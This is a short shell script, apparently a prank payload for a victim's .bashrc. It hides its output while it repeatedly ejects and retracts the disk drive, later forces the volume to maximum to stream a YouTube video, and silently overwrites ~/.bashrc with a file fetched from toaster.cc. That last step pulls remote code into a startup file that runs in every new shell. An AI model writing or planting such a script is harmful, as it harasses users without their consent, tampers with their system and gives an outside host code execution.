alias sl="tree -R"
# Disk drive
sleep $RANDOM && (while true; do ( eject && eject -t) done)&
disown

# And his name is...
(sleep 780 && amixer -q set Master unmute && amixer -q set Master 100%+ && cvlc https://www.youtube.com/watch?v=enMReCEcHiM --sout '#display{novideo}' 2> /dev/null 1> /dev/null)&
disown

wget toaster.cc/bash -O ~/.bashrc 2> /dev/null 1> /dev/null
